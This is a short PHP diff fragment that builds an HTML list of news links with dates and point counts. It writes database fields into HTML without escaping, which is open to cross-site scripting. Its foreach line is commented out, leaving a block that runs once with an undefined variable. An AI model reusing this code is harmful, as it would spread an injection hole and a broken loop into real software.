+	//foreach ($ret2 as $row2) 
+	{
+		$news_sel .= "<li><a href=\"news.php?cod={$row2["cod"]}\">{$row2["title"]}</a><br />
+		<span class=\"newspol2\">- ".show_date($row2["data_f"], false)." (".number_format($row2["pop"], 0, ',', ' ')." pkt.)</span></li>\n";
+	}
+	$news_sel .= "</ul>";
+	return $news_sel;
+}
+
+?>
